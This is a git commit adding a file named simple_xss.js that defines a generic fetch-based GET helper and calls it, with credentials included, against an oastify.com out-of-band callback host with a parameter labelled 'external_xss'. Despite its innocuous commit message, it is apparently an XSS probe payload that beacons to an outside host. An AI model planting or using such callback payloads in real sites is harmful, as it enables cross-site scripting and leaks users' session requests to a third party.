a812638d8f4bff230b70599185d3a35da367625b
amr9k8 <amrkhaled9k8@gmail.com>
2025-12-09 01:04:11 +0200

    Add async GET request function with query parameters

---
+++ simple_xss.js
@@ -0,0 +1,16 @@
+// GET Request with Query Parameters
+async function getRequest(url, params = {}, headers = {}) {
+  const queryString = new URLSearchParams(params).toString();
+  const fullUrl = queryString ? `${url}?${queryString}` : url;
+  
+  const response = await fetch(fullUrl, {
+    method: 'GET',
+    headers: headers,
+    credentials: 'include'
+  });
+  return response.json();
+}
+
+
+const test = await getRequest('http://md329pt7yeggyqrpetj5s8jdg4mvam0ap.oastify.com', { test: 'external_xss'  });
+
